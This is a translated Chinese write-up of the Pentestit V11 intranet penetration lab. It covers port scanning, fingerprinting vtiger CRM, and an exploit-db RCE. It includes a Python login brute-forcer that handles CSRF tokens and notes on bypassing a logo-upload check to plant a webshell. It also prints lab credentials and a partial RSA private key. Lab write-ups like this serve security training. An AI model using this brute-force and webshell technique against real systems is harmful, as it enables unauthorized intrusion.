# Pentestit V11内网渗透
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
最近发现了一个很好玩的域渗透练习平台：
，这个平台发给我们一个vpn然后让我们进去他们内网进行渗透测试。这个域中包括各种各样的主机和服务，可以说是非常棒了，今天在这里给大家分享一下一些有意思的地方。好吧我承认，这篇文章是内网渗透之边缘ob，因为网络原因很多东西都受限制，今天在这起一个抛转引玉的作用，有什么不足之处还请大佬们多多关照。
## Start!
配置好vpn后，进入其内外，网络拓扑图如下：  
这里有两个办公区，入口分别为192.168.101.10和192.168.101.11，我们先进入主办公区进行渗透。
常规思路：
  1. Nmap进行端口扫描 
        nmap -sV -p 1-65535 192.168.101.10
  2. 扫描其目录及信息泄露  
这里每个web服务都得扫，然后每个目录下都有可能存在信息泄露，这里我扫的有点快，然后不知咋了，可能是ban了我10分钟ip
  3. 逛80端口网站的时候，在Brup中看到HTTP History的时候发现：  
看到wp-content这个文件夹后基本就能确定是WordPress，然后上github看了一下WP的目录结构  
证明猜想正确，果不其然，顺手google一发：  
仿佛flag就在眼前了，  
但是，这里按照给的exp跑的时候，并不能跑出来，仔细一看：  
漏洞页面被删了，然后继续测试后面那个EXP，也被开发者删了。
Nmap扫到3个web应用，我们继续看88端口的web服务，发现了指纹：Powered by vtiger CRM 6.3.0
Google: vtiger CRM 6.3.0 cve  
发现一个RCE的洞：[https://www.exploit-db.com/exploits/38345/，但是这个需要登录而且没有注册按钮！](https://www.exploit-db.com/exploits/38345/%EF%BC%8C%E4%BD%86%E6%98%AF%E8%BF%99%E4%B8%AA%E9%9C%80%E8%A6%81%E7%99%BB%E5%BD%95%E8%80%8C%E4%B8%94%E6%B2%A1%E6%9C%89%E6%B3%A8%E5%86%8C%E6%8C%89%E9%92%AE%EF%BC%81)
不过这里没有验证码，所以可以爆一个账户登进去了。
但是这里还是有一个技术难点的，我们抓包的时候可以发现，如下图所示，这里为了防止CSRF，带了一个反csrf的令牌  
正常的发包过程是，先进入登录界面，里面有个隐藏字段__vtrftk  
然后登录的时候，就带着这个表单中隐藏的字段来发送，和服务端的这个参数进行比较。
所以我们爆破的时候，就得先发包到index抓取到__vtrftk字段，然后带着vtrftk字段再发一个包提交表单。
> ps:
> 有一种比较容易的情形就是，csrf的token在登录请求的返回包中，我们可以直接用Brup的intruder模块中用正则抓取到token，然后作为下一次提交表单的参数。在乌云上有一篇文章说的不错：
但是这里情形比较特殊，搜索了很久之后还是放弃了，自己写脚本来处理吧…
    # coding:utf-8
    from urllib.request import urlopen
    from bs4 import BeautifulSoup
    import requests
    get_token_url = ''
    login_url = ''
    def  get_token():
        html = urlopen(get_token_url)
        bs = BeautifulSoup(html,"html.parser")
        return bs.find("input", {"type": "hidden"}).attrs["value"]
    def get_dict(filename):
        try:
            f = open(filename, 'r')
            result = list()
            for line in f.readlines():
                line = line.strip()
                result.append(line)
            print(result)
            f.close()
            return result
        except:
            print("Read_error")
            exit()
    def login():
        proxies = {
            'http': 'http://127.0.0.1:8080'
        }
        usernames = get_dict('username.txt')
        passwords = get_dict('password.txt')
        for username in usernames:
            for password in passwords:
                __vtrftk = get_token()
                data = {
                    '__vtrftk': __vtrftk,
                    'username': str(username),
                    'password': str(password)
                }
                try:
                    requests.post(login_url, data=data, proxies=proxies)
                except:
                    print("login error")
    if __name__ == "__main__":
        login()
>
> 这个脚本中我使用了代理127.0.0.1:8080，是因为burp的在本地监听8080端口，我们通过这个代理，可以清晰的看到流量的请求和响应过程，便于我们分析。(同样，我们在编写各类exp的时候，都可以这样做，便于我们分析流量)
梯子很卡，爆了很久之后才出密码。
好了，该exp派上用场。根据exp所述，在上传公司logo的地方可以getshell
在这里我卡了很久，一直都被检测出图片不合法，exp也没说这个坑点。后来我才发现，这里采用了文件内容检测，检测到php字符就认不合法。所以这里用php的一个小知识，
成功Getshell~  
第一个Flag拿到了!
    Give_me_all
接下来，信息收集一波就直奔内网了~  
但是很烦的是…shell很快就被删掉了，都没来得及看他数据啥的文件，也没来得及维权，上ew来内网漫游。
信息收集，菜单栏一个个点开,邮件、垃圾箱一个都不能少  
整理一下：
    User Name    admin    Primary Email    PI:EMAIL
    First Name    darthvader    Last Name    Administrator
    Admin    Yes    Role    CEO
    Default Lead View    Today    Status    Active
    Viewing user details  "darthvader Administrator"
    Access Key    hDUTJPEVCi7KAIQu
这里基本上就弄完了，然后又试了一次上个不死马，结果还是404了，大概可以猜到这个域环境很多人都在打，环境定时恢复快照了吧，因为我又在CRM邮箱中添加了一个管理员，过了一会也没了。所以大概猜想出题人没有想让我们在这进行内网漫游。
Go on!
再来看看第三个web服务  
也是一个邮件系统：Roundcube Webmail， 哇….突然发现信息收集真是牛逼…. 试了一次就进去了!
    PI:EMAIL  darthvader
一点进来又送我一个大礼包, 第二个办公区的SSH Get!  
![Alt text])
    Mattew,
    Office 2 GW SSH:
    username: tech
    pkey:
    -----BEGIN RSA PRIVATE KEY-----    MIIEowIBAAKCAQEA01uFJH2WZT9MQgTRG7raRRgK4uDfOSYzWRiw5MRrch9g8iFZ
    6XQkh+m0jGOFB/1Z1ZulpmhTwdLuc6NwbBWtgghi+OmmQVkEnO86Oy2djqoQIaZa
    m+g4ZZMNPakCiuXYJGepz82dRo+FIeZuuahLA7lt76N88yGbYOneN+uzG/rKu9ra
    fx7F9Nj1Mftwy7/uGaumCYy+H8siwitkn+D4Sv8w0hR51OwQ5q1OUV3HWsMZzdWa
    HtR5ADbnV1/Pq5Rohy2j34zquhhYiMEa+XSTukobza4DPXZdhgGUCMp9rfvEoVwY
    JnOR/Ug6C39cr6gXHMqruK9crXwHJ0PzEjV8QQIDAQABAoIBAAYLLel3Nd+7SaDx
    plEWrLshDt6h84Ac2YcIr7Y675+ZyhniXkHQsmK4ihMhnWI3GmSDSN9TSGHYeD0S
    RVqx2/5F4x6e/8QKmZkrNg0PJtw3fLKZoSmoIES3Sb+jn5D9NYsE89QfWwnzfKkV
    f8ELUOnQWZZqpF4Hbfv9c/9BXCPGoMZC0uURwLn0IfTszr7uJM3ByRte1ui9nkJx
    dYJI5ixmPrN1qawqSzLMpBR/2hOAr9aUAaVI/LEYgHlYTPNr21HlDIyHDeWMfeso